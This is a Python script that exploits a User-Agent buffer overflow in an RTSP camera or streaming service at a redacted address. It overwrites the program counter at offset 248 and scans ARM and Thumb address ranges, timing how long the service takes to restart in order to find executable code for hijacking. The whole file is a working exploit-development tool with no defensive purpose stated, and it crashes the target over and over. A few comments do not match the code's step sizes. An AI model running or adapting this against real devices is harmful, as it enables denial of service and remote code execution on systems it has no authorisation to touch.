#!/usr/bin/env python3
"""
rtsp_finegrain_scan.py — Fine-grained address scan of 0x7000-0x20000 range.

All previous probes tested wide gaps (0x8000, 0x10000, 0x20000, ...).
The RTSP binary .text section might start at 0x8100 (after ELF headers).
ELF headers at 0x8000 might be NX (non-executable), giving SIGSEGV.
The .text section starting at 0x8100 would be executable.

Also testing Thumb mode (addr|1) for each address.

Expected results:
  - FAST (2.4s): unmapped OR NX OR wrong ISA mode → SIGSEGV/SIGILL
  - HIT (4-70s): code executed before crash (binary found!)
  - PANIC (70s+): kernel-space code

This test runs in ISOLATION (no other concurrent RTSP tests).
Run ONLY after all other RTSP tests have completed.
"""

import socket, time, struct, sys

TARGET    = "█████████████"
RTSP_PORT = 554
PC_OFFSET = 248

def rtsp_alive(timeout=5):
    try:
        s = socket.socket(); s.settimeout(timeout)
        s.connect((TARGET, RTSP_PORT))
        s.sendall(b"OPTIONS rtsp://" + TARGET.encode() + b":554/ RTSP/1.0\r\nCSeq: 1\r\n\r\n")
        d = b""
        try: d = s.recv(256)
        except: pass
        s.close()
        return b"RTSP" in d
    except:
        return False

def wait_rtsp(max_wait=120, label=""):
    t0 = time.time()
    while time.time() - t0 < max_wait:
        if rtsp_alive():
            elapsed = time.time() - t0
            if elapsed > 2:
                print(f"  [✓] RTSP alive ({label}) — waited {elapsed:.0f}s", flush=True)
            return True
        time.sleep(1.5)
    print(f"  [✗] RTSP dead after {max_wait}s ({label})", flush=True)
    return False

def probe(pc_addr, poll_timeout=90, label=""):
    """Send User-Agent overflow with PC=pc_addr, return restart_time."""
    if not wait_rtsp(60, label="pre"):
        return None
    pc_bytes = struct.pack('<I', pc_addr)
    payload  = b'A' * PC_OFFSET + pc_bytes + b'C' * 64
    req = (b"DESCRIBE rtsp://" + TARGET.encode() + b":554/live RTSP/1.0\r\n"
           b"CSeq: 1\r\nUser-Agent: " + payload + b"\r\n\r\n")
    t0 = time.time()
    try:
        s = socket.socket(); s.settimeout(8)
        s.connect((TARGET, RTSP_PORT)); s.sendall(req)
        try: s.recv(256)
        except: pass
        s.close()
    except: pass

    PROBE_REQ = b"OPTIONS rtsp://" + TARGET.encode() + b":554/ RTSP/1.0\r\nCSeq: 99\r\n\r\n"
    deadline = t0 + poll_timeout
    while time.time() < deadline:
        time.sleep(0.4)
        try:
            s2 = socket.socket(); s2.settimeout(3)
            s2.connect((TARGET, RTSP_PORT))
            s2.sendall(PROBE_REQ)
            d = b""
            try: d = s2.recv(256)
            except: pass
            s2.close()
            if b"RTSP" in d:
                t = time.time() - t0
                tag = "FAST" if t < 4 else ("HIT" if t < 70 else "PANIC")
                print(f"  [★] 0x{pc_addr:08X} ({label}) T+{t:.1f}s [{tag}]", flush=True)
                return t
        except: pass
    print(f"  [?] 0x{pc_addr:08X} no restart in {poll_timeout}s", flush=True)
    return float(poll_timeout)


print("=" * 70)
print("Fine-grained scan: 0x7000 - 0x20000, 256-byte steps")
print("Testing BOTH ARM (even) and Thumb (odd=addr|1) at each address")
print("PC_OFFSET=248 (User-Agent overflow)")
print("ISOLATION TEST: Run with no other RTSP tests active!")
print("=" * 70)

wait_rtsp(max_wait=120, label="start")
print()

HITS = []

# Range 0x7000 to 0x20000, step 256 = 52 addresses
# Both ARM mode (even) and Thumb mode (addr|1) for each
for base in range(0x7000, 0x20000, 0x200):   # step 512 to reduce test count
    for arm_or_thumb, suffix in [(0, "ARM"), (1, "THM")]:
        addr = base | arm_or_thumb
        t = probe(addr, poll_timeout=90, label=f"0x{base:05X}_{suffix}")
        tag = "FAST" if (t and t < 4) else ("HIT" if (t and t < 70) else ("PANIC" if (t and t < 90) else "DEAD"))
        print(f"  0x{addr:08X} [{suffix}]  t={t:.1f}s  {tag}", flush=True)
        if t is not None and t >= 4:
            HITS.append((addr, t, tag, suffix))
            print(f"  *** NON-FAST RESULT! addr=0x{addr:08X} t={t:.1f}s [{tag}] [{suffix}] ***", flush=True)
        wait_rtsp(120, label=f"after {addr:08X}")

print()
print("=" * 70)
print("SUMMARY:")
if HITS:
    for addr, t, tag, suffix in HITS:
        print(f"  0x{addr:08X} [{suffix}]  {t:.1f}s  {tag}")
else:
    print("  All FAST (2.4s) — binary not in 0x7000-0x20000 range")
    print("  Conclusions:")
    print("    1. Binary might be at higher address (>0x20000)")
    print("    2. ASLR might be enabled (each run different address)")
    print("    3. NX might be blocking .text execution (very unlikely)")

# Also test a few specific mmap library addresses more finely
print()
print("=" * 70)
print("Supplemental: fine-grained mmap range 0x40008000-0x40028000 (512B steps)")
print("=" * 70)

for base in range(0x40008000, 0x40028000, 0x200):
    for arm_or_thumb, suffix in [(0, "ARM"), (1, "THM")]:
        addr = base | arm_or_thumb
        t = probe(addr, poll_timeout=90, label=f"0x{base:08X}_{suffix}")
        tag = "FAST" if (t and t < 4) else ("HIT" if (t and t < 70) else ("PANIC" if (t and t < 90) else "DEAD"))
        print(f"  0x{addr:08X} [{suffix}]  t={t:.1f}s  {tag}", flush=True)
        if t is not None and t >= 4:
            HITS.append((addr, t, tag, suffix))
            print(f"  *** NON-FAST! 0x{addr:08X} t={t:.1f}s ***", flush=True)
        wait_rtsp(120, label=f"after {addr:08X}")

print()
print("=" * 70)
print("ALL NON-FAST HITS:")
if HITS:
    for addr, t, tag, suffix in HITS:
        print(f"  0x{addr:08X} [{suffix}]  {t:.1f}s  {tag}")
else:
    print("  None found — binary address not in tested ranges")
print("Done.")
